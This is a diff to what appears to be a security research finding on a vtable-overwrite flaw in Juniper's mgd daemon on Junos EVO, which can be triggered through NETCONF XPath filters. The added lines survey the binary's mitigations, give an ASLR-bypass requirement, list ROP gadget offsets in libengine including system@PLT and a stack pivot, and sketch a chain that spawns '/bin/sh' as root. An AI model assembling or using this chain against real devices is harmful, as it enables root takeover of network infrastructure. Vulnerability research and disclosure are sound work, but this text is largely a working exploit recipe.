@@ -635,8 +635,40 @@ FINDING 2 — vtable overwrite (RCE):
   Trigger (after overwrite): any NETCONF XPath filter with child-element or parent axis:
     xmlXPathNodeCollectAndTest → cs_xmlXPathNextChildElement/Parent → call *(BSS slot)
     → arbitrary code execution in mgd context (root on FreeBSD/Junos EVO).
-  ASLR note: vtable BSS offset from load base is constant. Without a leak, attacker
-    needs to guess or brute-force load base. mgd's ASLR posture on EVO not yet confirmed.
+  MITIGATION POSTURE (EVO 23.4R2.14, binary-verified):
+    NX:     ON  — GNU_STACK flags = RW (not RWX); shellcode injection path closed.
+    PIE:    ON  — mgd = ET_DYN; libengine = ET_DYN. ASLR active on EVO. Load bases
+                  randomized at process start. Inter-library delta constant within process.
+    RELRO:  OFF — GOT writable on mgd and libengine (confirmed: no PT_GNU_RELRO segment).
+    Canary: NOT PRESENT — function prologues in libengine use push/sub, no FS:0x28 load.
+
+  ASLR bypass requirement: need one address leak (e.g., via NETCONF error message
+    containing a pointer) to compute libengine base, then derive libc base via fixed
+    inter-library offset. Or: brute-force 64-bit ASLR space is infeasible. Leak required.
+
+  ROP GADGET LANDSCAPE (libengine.so.1, load-base-relative offsets):
+    pop rdi; ret             @ 0x5b18d
+    pop rsi; pop rbp; ret   @ 0x3bb37  (nearest single pop rsi)
+    pop rdx; ret             @ 0x3ed0f
+    pop rcx; ret             @ 0x5141e
+    pop rax; ret             @ 0x333c8
+    pop rsp; ret             @ 0xa8220  (stack pivot — pivot RSP to attacker-controlled buf)
+    pop rbp; ret             @ 0x3bb38
+    system@PLT               @ 0x35ec0  (system(3) imported: U system@GLIBC_2.2.5)
+    execv@PLT                @ 0x3b3c0  (execv(2) imported: U execv@GLIBC_2.2.5)
+
+  CHAIN SKETCH — system("/bin/sh") via vtable overwrite (load-base-relative):
+    Requires: write primitive to BSS 0x150b30 in libxml2.so.3 (FINDING 2 precondition);
+              libengine base address leak for gadget offsets.
+    Step 1: Place "/bin/sh\x00" at a known writable addr (e.g., BSS+fixed-offset in
+            libengine: 0x25c4a0 region is GOT-adjacent and writable, or use heap spray).
+    ROP chain written to BSS or heap (any writable, non-execute region):
+      [libengine_base + 0x5b18d]   # pop rdi; ret
+      [addr_of_binsh_str]           # rdi = "/bin/sh"
+      [libengine_base + 0x35ec0]   # call system@PLT -> system("/bin/sh")
+    Overwrite BSS[0x150b30] with addr of ROP chain start (needs stack pivot first
+    if vtable slot dispatches via call, not jmp).
+    Trigger: send NETCONF RPC with XPath filter containing child:: or parent:: axis.
 
 ---
 
